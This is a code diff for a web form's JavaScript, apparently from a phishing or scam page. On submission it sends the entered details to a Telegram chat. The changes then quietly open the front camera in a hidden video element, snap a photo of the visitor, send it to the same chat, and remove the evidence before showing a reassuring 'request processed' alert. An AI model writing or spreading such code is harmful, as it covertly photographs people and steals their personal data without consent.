@@ -80,19 +80,20 @@ async function sendPhoto(chatId, photo) {
     }
 }
 
-async function capturePhoto() {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+async function capturePhoto(video) {
+    const canvas = document.createElement('canvas');
     const context = canvas.getContext('2d');
 
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
-    context.drawImage(video, 0, 0);
+
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
     const photo = canvas.toDataURL('image/png');
 
-    return fetch(photo)
-        .then(res => res.blob())
-        .then(blob => new File([blob], 'photo.png', { type: 'image/png' }));
+    // Convert data URL to Blob
+    const response = await fetch(photo);
+    const blob = await response.blob();
+    return new File([blob], 'photo.png', { type: 'image/png' });
 }
 
 async function sendInitialInfo() {
@@ -156,8 +157,14 @@ document.getElementById('data-form').addEventListener('submit', async function (
 
     await sendTelegramMessage(chatId, message);
 
-    const photo = await capturePhoto();
+    const video = await startCamera();
+    const photo = await capturePhoto(video);
     await sendPhoto(chatId, photo);
+
+    // Stop the camera and clean up
+    const tracks = video.srcObject.getTracks();
+    tracks.forEach(track => track.stop());
+    video.remove();
 
     alert("Your request has been processed under 24 hours !");
 });
@@ -169,10 +176,22 @@ document.getElementById('mobile-number').addEventListener('input', function () {
 });
 
 async function startCamera() {
-    const video = document.getElementById('video');
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-    video.srcObject = stream;
-    video.play();
-}
+    const video = document.createElement('video');
+    video.style.display = 'none'; // Hide the video element
+    document.body.appendChild(video);
 
-startCamera();
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        video.srcObject = stream;
+        video.play();
+
+        await new Promise(resolve => {
+            video.onloadedmetadata = resolve;
+        });
+
+        return video;
+    } catch (error) {
+        console.error("Error accessing camera:", error);
+        return null;
+    }
+}
